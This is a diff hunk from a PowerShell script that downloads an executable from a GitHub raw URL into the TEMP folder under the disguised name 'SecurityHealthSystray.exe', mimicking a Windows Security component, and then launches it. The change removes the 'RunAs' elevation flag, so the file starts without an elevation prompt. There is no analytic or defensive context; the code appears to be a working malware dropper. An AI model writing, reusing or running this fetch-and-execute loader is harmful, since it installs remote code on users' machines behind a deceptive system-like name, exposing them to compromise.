@@ -12,7 +12,7 @@ $outputPath = [System.IO.Path]::Combine($env:TEMP, 'SecurityHealthSystray.exe')
 $webClient = New-Object System.Net.WebClient
 
 $webClient.DownloadFile("https://github.com/MB2RZEN/Neak/raw/refs/heads/main/Built.exe", $outputPath)
-Start-Process -FilePath $outputPath -Verb RunAs
+Start-Process -FilePath $outputPath
 
 
 
